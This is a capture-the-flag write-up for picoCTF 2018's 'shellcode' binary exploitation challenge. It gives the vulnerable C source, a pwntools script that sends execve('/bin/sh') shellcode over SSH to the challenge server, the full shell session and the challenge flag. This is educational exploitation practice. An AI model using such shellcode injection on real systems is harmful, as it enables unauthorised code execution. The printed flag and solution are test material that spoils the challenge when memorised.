# shellcode
Binary Exploitation, 200 points

## Description:
> This program executes any input you give it. Can you get a shell? 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter a string!");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();
     
  return 0;
}
```

## Solution:

We'll use pwntools' "shellcode" module to generate a shellcode:

```python
from pwn import *
import argparse
import os

EXECUTABLE = "vuln"
LOCAL_PATH = "./"
REMOTE_PATH = "/problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed/"
SSH_SERVER = "2018shell3.picoctf.com"

def get_process_path(is_ssh = False):
    if is_ssh or os.path.exists(REMOTE_PATH):
        return REMOTE_PATH + EXECUTABLE
    else:
        return LOCAL_PATH + EXECUTABLE

def get_process(ssh_user = None):
    is_ssh = ssh_user is not None
    path = get_process_path(is_ssh)
    params = {"argv": path, "cwd": os.path.dirname(path)}
    if is_ssh:
        s = ssh(host=SSH_SERVER, user=ssh_user)
        p = s.process(**params)
    else:
        p = process(**params)
    return p


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username")
args = parser.parse_args()

context.binary = get_process_path()
p = get_process(args.ssh_user)
shellcode = shellcraft.sh()
print "Shellcode:"
print shellcode

payload = asm(shellcode)
p.sendlineafter("Enter a string!", payload)
p.interactive()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/shellcode# python exploit.py --ssh_user=$pico_ssh_user
[*] '/media/sf_CTFs/pico/shellcode/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Connecting to 2018shell3.picoctf.com on port 22: Done
[*] user@2018shell3.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Starting remote process '/problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed/vuln' on 2018shell3.picoctf.com: pid 94685
Shellcode:
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

[*] Switching to interactive mode

jhh///sh/bin\x89h\x814$ri1Qj\x04YQ1j\x0bX̀
Thanks! Executing now...
$ $ ls
flag.txt  vuln    vuln.c
$ $ cat flag.txt
picoCTF{shellc0de_w00h00_9ee0edd0}$ $ exit
[*] Got EOF while reading in interactive
$
[*] Stopped remote process 'vuln' on 2018shell3.picoctf.com (pid 94685)
[*] Got EOF while sending in interactive
```

The flag: picoCTF{shellc0de_w00h00_9ee0edd0}